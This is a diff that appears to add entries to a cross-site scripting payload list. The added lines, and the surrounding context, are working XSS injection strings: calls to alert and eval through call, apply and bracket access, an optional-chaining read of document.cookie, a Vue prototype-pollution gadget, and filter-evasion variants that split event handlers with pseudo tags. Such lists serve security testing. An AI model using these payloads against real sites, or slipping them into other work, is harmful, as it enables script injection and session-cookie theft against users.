@@ -96,3 +96,19 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//
 '"><img src=x onerror=alert(1)>
 ';alert(1)//
 "onmouseover="alert(1)
+
+# === Sinks reached without a plain call, bracket access, pseudo tags ===
+alert.call( , "XSS");
+confirm.call(null,1)
+prompt.call(null,1)
+alert.apply(null, [1])
+alert?.(document?.cookie)
+(alert)(1)
+(eval)('alert(1)')
+document["cookie"]
+window['eval']('alert(1)')
+"));if(!self.x)self.x=!alert(document.domain)}catch(e){}//
+__proto__[v-if]=_c.constructor('alert(1)')()
+\"autof<x>ocus o<x>nfocus=alert<x>(1)//
+<img src=x on<x>error=alert(1)>
+javascript: alert(1)
